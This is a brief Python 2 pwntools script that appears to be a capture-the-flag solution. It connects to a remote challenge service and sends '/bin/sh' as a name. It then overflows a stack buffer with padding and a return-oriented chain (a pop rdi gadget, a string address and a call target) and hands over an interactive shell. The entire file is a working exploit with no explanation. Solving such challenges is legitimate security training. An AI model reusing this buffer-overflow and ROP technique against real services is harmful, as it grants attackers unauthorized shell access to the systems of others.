#!/usr/bin/env python2

from pwn import *

p = remote('isc.taiwan-te.ch', 10005)
p.sendlineafter('What is your name?', '/bin/sh')
pop_rdi = 0x0000000000400733
p.sendlineafter('Say something:', 'A' * (0x10 +8) + p64(pop_rdi) + p64(0x601070) + p64(0x00400682))

p.interactive()
p.close()
